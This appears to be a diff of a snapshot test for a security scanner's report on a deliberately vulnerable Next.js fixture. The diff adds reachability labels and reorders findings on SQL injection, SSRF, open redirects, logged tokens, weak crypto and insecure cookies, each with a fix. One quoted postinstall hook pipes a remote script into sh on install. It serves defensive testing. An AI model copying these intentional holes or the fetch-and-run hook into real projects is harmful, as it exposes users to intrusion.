@@ -5,9 +5,10 @@ expression: rendered
 
 ◉ᴥ◉ 7 files · owasp-top10 · 0.12s
 21 findings (10 high, 11 medium)
+12 internet-reachable, 4 internal, 5 unclassified
 
 ────────────────────────────────────────────────────────────────────────
-HIGH  likely  SQL query built by string interpolation  A03:2021
+HIGH  likely  internet  SQL query built by string interpolation  A03:2021
 ────────────────────────────────────────────────────────────────────────
  app/api/login/route.ts:16:5  ( /api/login)
 
@@ -31,7 +32,7 @@ HIGH  likely  SQL query built by string interpolation  A03:2021
  ⓘ  ref            OWASP A03:2021 · CWE-89 · RULES.md#sql-injection
 
 ────────────────────────────────────────────────────────────────────────
-HIGH  likely  Server fetches a URL the caller controls  A10:2021
+HIGH  likely  internet  Server fetches a URL the caller controls  A10:2021
 ────────────────────────────────────────────────────────────────────────
  app/api/proxy/route.ts:19:28  ( /api/proxy)
 
@@ -56,7 +57,7 @@ HIGH  likely  Server fetches a URL the caller controls  A10:2021
  ⓘ  ref            OWASP A10:2021 · CWE-918 · RULES.md#ssrf
 
 ────────────────────────────────────────────────────────────────────────
-HIGH  likely  Server fetches a URL the caller controls  A10:2021
+HIGH  likely  internet  Server fetches a URL the caller controls  A10:2021
 ────────────────────────────────────────────────────────────────────────
  app/api/proxy/route.ts:25:28  ( /api/proxy)
 
@@ -81,7 +82,7 @@ HIGH  likely  Server fetches a URL the caller controls  A10:2021
  ⓘ  ref            OWASP A10:2021 · CWE-918 · RULES.md#ssrf
 
 ────────────────────────────────────────────────────────────────────────
-HIGH  likely  Server fetches a URL the caller controls  A10:2021
+HIGH  likely  internet  Server fetches a URL the caller controls  A10:2021
 ────────────────────────────────────────────────────────────────────────
  app/api/proxy/route.ts:32:28  ( /api/proxy)
 
@@ -106,7 +107,7 @@ HIGH  likely  Server fetches a URL the caller controls  A10:2021
  ⓘ  ref            OWASP A10:2021 · CWE-918 · RULES.md#ssrf
 
 ────────────────────────────────────────────────────────────────────────
-HIGH  likely  Server fetches a URL the caller controls  A10:2021
+HIGH  likely  internet  Server fetches a URL the caller controls  A10:2021
 ────────────────────────────────────────────────────────────────────────
  app/api/proxy/route.ts:40:7  ( /api/proxy)
 
@@ -131,7 +132,7 @@ HIGH  likely  Server fetches a URL the caller controls  A10:2021
  ⓘ  ref            OWASP A10:2021 · CWE-918 · RULES.md#ssrf
 
 ────────────────────────────────────────────────────────────────────────
-HIGH  likely  Stack trace leaked in error response  A05:2021
+HIGH  likely  internet  Stack trace leaked in error response  A05:2021
 ────────────────────────────────────────────────────────────────────────
  app/api/users/route.ts:20:16  (GET /api/users)
 
@@ -154,7 +155,250 @@ HIGH  likely  Stack trace leaked in error response  A05:2021
  ⓘ  ref            OWASP A05:2021 · CWE-209 · RULES.md#stack-trace-leak
 
 ────────────────────────────────────────────────────────────────────────
-HIGH  likely  Credential hardcoded in source  A07:2021
+MEDIUM  likely  internet  Redirect target comes from the caller  A01:2021
+────────────────────────────────────────────────────────────────────────
+ app/api/proxy/route.ts:50:5  ( /api/proxy)
+
+  48 │   // open-redirect
+  49 │   if (next) {
+  50 │     redirect(next)
+     │     ~~~~~~~~~~~~~~ destination chosen by the caller
+  51 │   }
+
+ ↳  fix (Next.js)  Validate before calling redirect();
+                   request.nextUrl.origin is the base.
+                   import { redirect } from 'next/navigation'
+                   
+                   const next = request.nextUrl.searchParams.get('next')
+                   redirect(safeRedirect(next, request.nextUrl.origin))
+ ↳  why            The whole redirect target comes from the request, so
+                   a link to this endpoint can send a visitor anywhere.
+                   The URL they click genuinely belongs to you, which is
+                   what makes the page they land on convincing — and on
+                   an OAuth callback the authorisation code goes with
+                   them.
+ ⓘ  ref            OWASP A01:2021 · CWE-601 · RULES.md#open-redirect
+
+────────────────────────────────────────────────────────────────────────
+MEDIUM  likely  internet  Redirect target comes from the caller  A01:2021
+────────────────────────────────────────────────────────────────────────
+ app/api/proxy/route.ts:56:5  ( /api/proxy)
+
+  54 │   const extraNext = url.searchParams.get('extraNext')
+  55 │   if (extraNext) {
+  56 │     redirect(extraNext)
+     │     ~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
+  57 │   }
+
+ ↳  fix (Next.js)  Validate before calling redirect();
+                   request.nextUrl.origin is the base.
+                   import { redirect } from 'next/navigation'
+                   
+                   const next = request.nextUrl.searchParams.get('next')
+                   redirect(safeRedirect(next, request.nextUrl.origin))
+ ↳  why            The whole redirect target comes from the request, so
+                   a link to this endpoint can send a visitor anywhere.
+                   The URL they click genuinely belongs to you, which is
+                   what makes the page they land on convincing — and on
+                   an OAuth callback the authorisation code goes with
+                   them.
+ ⓘ  ref            OWASP A01:2021 · CWE-601 · RULES.md#open-redirect
+
+────────────────────────────────────────────────────────────────────────
+MEDIUM  likely  internet  Redirect target comes from the caller  A01:2021
+────────────────────────────────────────────────────────────────────────
+ app/api/proxy/route.ts:62:5  ( /api/proxy)
+
+  60 │   if (manualNext) {
+  61 │     const headers = new Headers()
+  62 │     headers.set('Location', manualNext)
+     │     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
+  63 │     return new NextResponse(null, { status: 302, headers })
+  64 │   }
+
+ ↳  fix (Next.js)  Validate before calling redirect();
+                   request.nextUrl.origin is the base.
+                   import { redirect } from 'next/navigation'
+                   
+                   const next = request.nextUrl.searchParams.get('next')
+                   redirect(safeRedirect(next, request.nextUrl.origin))
+ ↳  why            The whole redirect target comes from the request, so
+                   a link to this endpoint can send a visitor anywhere.
+                   The URL they click genuinely belongs to you, which is
+                   what makes the page they land on convincing — and on
+                   an OAuth callback the authorisation code goes with
+                   them.
+ ⓘ  ref            OWASP A01:2021 · CWE-601 · RULES.md#open-redirect
+
+────────────────────────────────────────────────────────────────────────
+MEDIUM  likely  internet  Sensitive data written to a log  A09:2021
+────────────────────────────────────────────────────────────────────────
+ app/api/users/route.ts:11:18  ( /api/users)
+
+   9 │ export async function GET(request: Request) {
+  10 │   // sensitive-data-logged: the Authorization header lands in the log aggregator.
+  11 │   console.info({ authorization: request.headers.get('authorization') })
+     │                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ sensitive value written to a log
+  12 │   // sensitive-data-logged: the caller's access token, logged the same way.
+  13 │   const accessToken = request.headers.get('x-access-token')
+
+ ↳  fix (Next.js)  Log that the attempt happened, not the credential.
+                   console.info({ event: 'login_attempt', userId })
+                   // never: console.info({ password })
+ ↳  why            Logs are copied into aggregators, retained for
+                   months, and readable by anyone with access to the
+                   logging system. A credential that reaches a log has
+                   left the application's trust boundary.
+ ⓘ  ref            OWASP A09:2021 · CWE-532 ·
+                   RULES.md#sensitive-data-logged
+
+────────────────────────────────────────────────────────────────────────
+MEDIUM  likely  internet  Sensitive data written to a log  A09:2021
+────────────────────────────────────────────────────────────────────────
+ app/api/users/route.ts:14:18  ( /api/users)
+
+  12 │   // sensitive-data-logged: the caller's access token, logged the same way.
+  13 │   const accessToken = request.headers.get('x-access-token')
+  14 │   console.info({ accessToken })
+     │                  ~~~~~~~~~~~ sensitive value written to a log
+  15 │   try {
+  16 │     const users = await listUsers()
+
+ ↳  fix (Next.js)  Log that the attempt happened, not the credential.
+                   console.info({ event: 'login_attempt', userId })
+                   // never: console.info({ password })
+ ↳  why            Logs are copied into aggregators, retained for
+                   months, and readable by anyone with access to the
+                   logging system. A credential that reaches a log has
+                   left the application's trust boundary.
+ ⓘ  ref            OWASP A09:2021 · CWE-532 ·
+                   RULES.md#sensitive-data-logged
+
+────────────────────────────────────────────────────────────────────────
+MEDIUM  possible  internet  Cookie set without its protective attributes  A05:2021
+────────────────────────────────────────────────────────────────────────
+ app/api/login/route.ts:20:3  ( /api/login)
+
+  18 │ 
+  19 │   // insecure-cookie: Next's cookies().set with no attributes.
+  20 │   cookies().set('session', rows.rows[0]?.id ?? 'anon')
+     │   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ cookie written without httpOnly/secure/sameSite
+  21 │ 
+  22 │   return NextResponse.json({ ok: true })
+
+ ↳  fix (Next.js)  Pass the attributes to the cookie store.
+                   cookies().set('session', token, {
+                     httpOnly: true,
+                     secure: process.env.NODE_ENV === 'production',
+                     sameSite: 'lax',
+                     path: '/',
+                   })
+ ↳  why            This cookie is missing protections: httpOnly keeps
+                   the cookie out of reach of JavaScript, so a
+                   cross-site scripting bug cannot read the session;
+                   secure stops the cookie being sent over plain HTTP;
+                   sameSite stops the browser attaching the cookie to
+                   cross-site requests.
+ ⓘ  ref            OWASP A05:2021 · CWE-614 · RULES.md#insecure-cookie
+
+────────────────────────────────────────────────────────────────────────
+MEDIUM  likely  internal  GitHub Action is not pinned to a commit SHA  A08:2021
+────────────────────────────────────────────────────────────────────────
+ .github/workflows/ci.yml:8:1
+
+ ↳  fix (Next.js)  Pin the action to a full commit SHA (keep the tag in
+                   a comment for humans).
+                   uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+ ↳  why            A moving tag can be retargeted to a different commit.
+                   Anyone who can push that tag — or who compromises the
+                   action's repository — runs code in your CI with
+                   access to repository secrets.
+ ⓘ  ref            OWASP A08:2021 · CWE-829 ·
+                   RULES.md#ci-unpinned-action
+
+────────────────────────────────────────────────────────────────────────
+MEDIUM  likely  internal  Package declares an install-time script  A08:2021
+────────────────────────────────────────────────────────────────────────
+ package.json:7:5
+
+   5 │   "description": "Deliberately vulnerable Next.js App Router fixture. Never deploy this.",
+   6 │   "scripts": {
+   7 │     "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"
+     │                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ runs automatically on install (postinstall)
+   8 │   },
+   9 │   "dependencies": {
+
+ ↳  fix (Next.js)  Move the work into an explicit script the developer
+                   runs (`pnpm setup`), or into the build step. If it
+                   genuinely has to run at install time — a native addon
+                   — say so in the README and keep the script to the
+                   build tool, with no network fetch and no run-time
+                   package resolve.
+                   // package.json
+                   "scripts": { "prepare": "next build" }
+                   // and: pnpm config set ignore-scripts true
+ ↳  why            `postinstall` runs for everyone who installs this
+                   package, before any code is reviewed and often inside
+                   CI with credentials in the environment. This is the
+                   mechanism a compromised package uses to spread.
+ ⓘ  ref            OWASP A08:2021 · CWE-829 ·
+                   RULES.md#install-lifecycle-script
+
+────────────────────────────────────────────────────────────────────────
+MEDIUM  likely  internal  Dependency version is unpinned  A06:2021
+────────────────────────────────────────────────────────────────────────
+ package.json:14:1
+
+ ↳  fix (Next.js)  Pin the dependency in package.json and reinstall so
+                   the lockfile records it.
+                   {
+                     "dependencies": {
+                       "next": "^14.2.0"
+                     }
+                   }
+ ↳  why            An unpinned range lets the next install resolve a
+                   different major version, including one with a known
+                   vulnerability or a breaking API change, without
+                   anyone reviewing the bump.
+ ⓘ  ref            OWASP A06:2021 · CWE-1104 ·
+                   RULES.md#unpinned-dependency
+
+────────────────────────────────────────────────────────────────────────
+MEDIUM  possible  internal  Security headers are not configured  A05:2021
+────────────────────────────────────────────────────────────────────────
+ package.json:1:1
+
+ ↳  fix (Next.js)  Add a headers() block to next.config.js.
+                   // next.config.js
+                   module.exports = {
+                     async headers() {
+                       return [
+                         {
+                           source: '/:path*',
+                           headers: [
+                             { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains' },
+                             { key: 'Content-Security-Policy', value: "default-src 'self'" },
+                             { key: 'X-Content-Type-Options', value: 'nosniff' },
+                             { key: 'X-Frame-Options', value: 'DENY' },
+                             { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
+                           ],
+                         },
+                       ]
+                     },
+                   }
+ ↳  why            Without these headers the browser enforces nothing:
+                   strict-transport-security forces HTTPS for future
+                   requests; content-security-policy limits which
+                   scripts and origins the page may load;
+                   x-content-type-options stops browsers guessing a
+                   response's content type; x-frame-options blocks
+                   clickjacking via framing; referrer-policy stops URLs
+                   leaking to third parties.
+ ⓘ  ref            OWASP A05:2021 · CWE-693 ·
+                   RULES.md#security-headers-missing
+
+────────────────────────────────────────────────────────────────────────
+HIGH  likely  unknown  Credential hardcoded in source  A07:2021
 ────────────────────────────────────────────────────────────────────────
  app/lib/billing.ts:3:20
 
@@ -177,7 +421,7 @@ HIGH  likely  Credential hardcoded in source  A07:2021
  ⓘ  ref            OWASP A07:2021 · CWE-798 · RULES.md#hardcoded-secret
 
 ────────────────────────────────────────────────────────────────────────
-HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
+HIGH  likely  unknown  Broken cryptographic primitive protecting a secret  A02:2021
 ────────────────────────────────────────────────────────────────────────
  app/lib/crypto.ts:8:35
 
@@ -200,7 +444,7 @@ HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
  ⓘ  ref            OWASP A02:2021 · CWE-327 · RULES.md#weak-crypto
 
 ────────────────────────────────────────────────────────────────────────
-HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
+HIGH  likely  unknown  Broken cryptographic primitive protecting a secret  A02:2021
 ────────────────────────────────────────────────────────────────────────
  app/lib/crypto.ts:14:24
 
@@ -222,7 +466,7 @@ HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
  ⓘ  ref            OWASP A02:2021 · CWE-327 · RULES.md#weak-crypto
 
 ────────────────────────────────────────────────────────────────────────
-HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
+HIGH  likely  unknown  Broken cryptographic primitive protecting a secret  A02:2021
 ────────────────────────────────────────────────────────────────────────
  app/lib/crypto.ts:20:18
 
@@ -257,142 +501,7 @@ HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
  ⓘ  ref            OWASP A02:2021 · CWE-327 · RULES.md#weak-crypto
 
 ────────────────────────────────────────────────────────────────────────
-MEDIUM  likely  GitHub Action is not pinned to a commit SHA  A08:2021
-────────────────────────────────────────────────────────────────────────
- .github/workflows/ci.yml:8:1
-
- ↳  fix (Next.js)  Pin the action to a full commit SHA (keep the tag in
-                   a comment for humans).
-                   uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
- ↳  why            A moving tag can be retargeted to a different commit.
-                   Anyone who can push that tag — or who compromises the
-                   action's repository — runs code in your CI with
-                   access to repository secrets.
- ⓘ  ref            OWASP A08:2021 · CWE-829 ·
-                   RULES.md#ci-unpinned-action
-
-────────────────────────────────────────────────────────────────────────
-MEDIUM  likely  Redirect target comes from the caller  A01:2021
-────────────────────────────────────────────────────────────────────────
- app/api/proxy/route.ts:50:5  ( /api/proxy)
-
-  48 │   // open-redirect
-  49 │   if (next) {
-  50 │     redirect(next)
-     │     ~~~~~~~~~~~~~~ destination chosen by the caller
-  51 │   }
-
- ↳  fix (Next.js)  Validate before calling redirect();
-                   request.nextUrl.origin is the base.
-                   import { redirect } from 'next/navigation'
-                   
-                   const next = request.nextUrl.searchParams.get('next')
-                   redirect(safeRedirect(next, request.nextUrl.origin))
- ↳  why            The whole redirect target comes from the request, so
-                   a link to this endpoint can send a visitor anywhere.
-                   The URL they click genuinely belongs to you, which is
-                   what makes the page they land on convincing — and on
-                   an OAuth callback the authorisation code goes with
-                   them.
- ⓘ  ref            OWASP A01:2021 · CWE-601 · RULES.md#open-redirect
-
-────────────────────────────────────────────────────────────────────────
-MEDIUM  likely  Redirect target comes from the caller  A01:2021
-────────────────────────────────────────────────────────────────────────
- app/api/proxy/route.ts:56:5  ( /api/proxy)
-
-  54 │   const extraNext = url.searchParams.get('extraNext')
-  55 │   if (extraNext) {
-  56 │     redirect(extraNext)
-     │     ~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
-  57 │   }
-
- ↳  fix (Next.js)  Validate before calling redirect();
-                   request.nextUrl.origin is the base.
-                   import { redirect } from 'next/navigation'
-                   
-                   const next = request.nextUrl.searchParams.get('next')
-                   redirect(safeRedirect(next, request.nextUrl.origin))
- ↳  why            The whole redirect target comes from the request, so
-                   a link to this endpoint can send a visitor anywhere.
-                   The URL they click genuinely belongs to you, which is
-                   what makes the page they land on convincing — and on
-                   an OAuth callback the authorisation code goes with
-                   them.
- ⓘ  ref            OWASP A01:2021 · CWE-601 · RULES.md#open-redirect
-
-────────────────────────────────────────────────────────────────────────
-MEDIUM  likely  Redirect target comes from the caller  A01:2021
-────────────────────────────────────────────────────────────────────────
- app/api/proxy/route.ts:62:5  ( /api/proxy)
-
-  60 │   if (manualNext) {
-  61 │     const headers = new Headers()
-  62 │     headers.set('Location', manualNext)
-     │     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
-  63 │     return new NextResponse(null, { status: 302, headers })
-  64 │   }
-
- ↳  fix (Next.js)  Validate before calling redirect();
-                   request.nextUrl.origin is the base.
-                   import { redirect } from 'next/navigation'
-                   
-                   const next = request.nextUrl.searchParams.get('next')
-                   redirect(safeRedirect(next, request.nextUrl.origin))
- ↳  why            The whole redirect target comes from the request, so
-                   a link to this endpoint can send a visitor anywhere.
-                   The URL they click genuinely belongs to you, which is
-                   what makes the page they land on convincing — and on
-                   an OAuth callback the authorisation code goes with
-                   them.
- ⓘ  ref            OWASP A01:2021 · CWE-601 · RULES.md#open-redirect
-
-────────────────────────────────────────────────────────────────────────
-MEDIUM  likely  Sensitive data written to a log  A09:2021
-────────────────────────────────────────────────────────────────────────
- app/api/users/route.ts:11:18  ( /api/users)
-
-   9 │ export async function GET(request: Request) {
-  10 │   // sensitive-data-logged: the Authorization header lands in the log aggregator.
-  11 │   console.info({ authorization: request.headers.get('authorization') })
-     │                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ sensitive value written to a log
-  12 │   // sensitive-data-logged: the caller's access token, logged the same way.
-  13 │   const accessToken = request.headers.get('x-access-token')
-
- ↳  fix (Next.js)  Log that the attempt happened, not the credential.
-                   console.info({ event: 'login_attempt', userId })
-                   // never: console.info({ password })
- ↳  why            Logs are copied into aggregators, retained for
-                   months, and readable by anyone with access to the
-                   logging system. A credential that reaches a log has
-                   left the application's trust boundary.
- ⓘ  ref            OWASP A09:2021 · CWE-532 ·
-                   RULES.md#sensitive-data-logged
-
-────────────────────────────────────────────────────────────────────────
-MEDIUM  likely  Sensitive data written to a log  A09:2021
-────────────────────────────────────────────────────────────────────────
- app/api/users/route.ts:14:18  ( /api/users)
-
-  12 │   // sensitive-data-logged: the caller's access token, logged the same way.
-  13 │   const accessToken = request.headers.get('x-access-token')
-  14 │   console.info({ accessToken })
-     │                  ~~~~~~~~~~~ sensitive value written to a log
-  15 │   try {
-  16 │     const users = await listUsers()
-
- ↳  fix (Next.js)  Log that the attempt happened, not the credential.
-                   console.info({ event: 'login_attempt', userId })
-                   // never: console.info({ password })
- ↳  why            Logs are copied into aggregators, retained for
-                   months, and readable by anyone with access to the
-                   logging system. A credential that reaches a log has
-                   left the application's trust boundary.
- ⓘ  ref            OWASP A09:2021 · CWE-532 ·
-                   RULES.md#sensitive-data-logged
-
-────────────────────────────────────────────────────────────────────────
-MEDIUM  likely  Cross-origin policy accepts any origin  A05:2021
+MEDIUM  likely  unknown  Cross-origin policy accepts any origin  A05:2021
 ────────────────────────────────────────────────────────────────────────
  app/lib/cors.ts:7:3
 
@@ -417,113 +526,5 @@ MEDIUM  likely  Cross-origin policy accepts any origin  A05:2021
                    the source says which this is, so it is reported for
                    you to decide.
  ⓘ  ref            OWASP A05:2021 · CWE-942 · RULES.md#cors-permissive
-
-────────────────────────────────────────────────────────────────────────
-MEDIUM  likely  Package declares an install-time script  A08:2021
-────────────────────────────────────────────────────────────────────────
- package.json:7:5
-
-   5 │   "description": "Deliberately vulnerable Next.js App Router fixture. Never deploy this.",
-   6 │   "scripts": {
-   7 │     "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"
-     │                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ runs automatically on install (postinstall)
-   8 │   },
-   9 │   "dependencies": {
-
- ↳  fix (Next.js)  Move the work into an explicit script the developer
-                   runs (`pnpm setup`), or into the build step. If it
-                   genuinely has to run at install time — a native addon
-                   — say so in the README and keep the script to the
-                   build tool, with no network fetch and no run-time
-                   package resolve.
-                   // package.json
-                   "scripts": { "prepare": "next build" }
-                   // and: pnpm config set ignore-scripts true
- ↳  why            `postinstall` runs for everyone who installs this
-                   package, before any code is reviewed and often inside
-                   CI with credentials in the environment. This is the
-                   mechanism a compromised package uses to spread.
- ⓘ  ref            OWASP A08:2021 · CWE-829 ·
-                   RULES.md#install-lifecycle-script
-
-────────────────────────────────────────────────────────────────────────
-MEDIUM  likely  Dependency version is unpinned  A06:2021
-────────────────────────────────────────────────────────────────────────
- package.json:14:1
-
- ↳  fix (Next.js)  Pin the dependency in package.json and reinstall so
-                   the lockfile records it.
-                   {
-                     "dependencies": {
-                       "next": "^14.2.0"
-                     }
-                   }
- ↳  why            An unpinned range lets the next install resolve a
-                   different major version, including one with a known
-                   vulnerability or a breaking API change, without
-                   anyone reviewing the bump.
- ⓘ  ref            OWASP A06:2021 · CWE-1104 ·
-                   RULES.md#unpinned-dependency
-
-────────────────────────────────────────────────────────────────────────
-MEDIUM  possible  Cookie set without its protective attributes  A05:2021
-────────────────────────────────────────────────────────────────────────
- app/api/login/route.ts:20:3  ( /api/login)
-
-  18 │ 
-  19 │   // insecure-cookie: Next's cookies().set with no attributes.
-  20 │   cookies().set('session', rows.rows[0]?.id ?? 'anon')
-     │   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ cookie written without httpOnly/secure/sameSite
-  21 │ 
-  22 │   return NextResponse.json({ ok: true })
-
- ↳  fix (Next.js)  Pass the attributes to the cookie store.
-                   cookies().set('session', token, {
-                     httpOnly: true,
-                     secure: process.env.NODE_ENV === 'production',
-                     sameSite: 'lax',
-                     path: '/',
-                   })
- ↳  why            This cookie is missing protections: httpOnly keeps
-                   the cookie out of reach of JavaScript, so a
-                   cross-site scripting bug cannot read the session;
-                   secure stops the cookie being sent over plain HTTP;
-                   sameSite stops the browser attaching the cookie to
-                   cross-site requests.
- ⓘ  ref            OWASP A05:2021 · CWE-614 · RULES.md#insecure-cookie
-
-────────────────────────────────────────────────────────────────────────
-MEDIUM  possible  Security headers are not configured  A05:2021
-────────────────────────────────────────────────────────────────────────
- package.json:1:1
-
- ↳  fix (Next.js)  Add a headers() block to next.config.js.
-                   // next.config.js
-                   module.exports = {
-                     async headers() {
-                       return [
-                         {
-                           source: '/:path*',
-                           headers: [
-                             { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains' },
-                             { key: 'Content-Security-Policy', value: "default-src 'self'" },
-                             { key: 'X-Content-Type-Options', value: 'nosniff' },
-                             { key: 'X-Frame-Options', value: 'DENY' },
-                             { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
-                           ],
-                         },
-                       ]
-                     },
-                   }
- ↳  why            Without these headers the browser enforces nothing:
-                   strict-transport-security forces HTTPS for future
-                   requests; content-security-policy limits which
-                   scripts and origins the page may load;
-                   x-content-type-options stops browsers guessing a
-                   response's content type; x-frame-options blocks
-                   clickjacking via framing; referrer-policy stops URLs
-                   leaking to third parties.
- ⓘ  ref            OWASP A05:2021 · CWE-693 ·
-                   RULES.md#security-headers-missing
 
 Run `owlwarden explain sql-injection` for the full write-up.
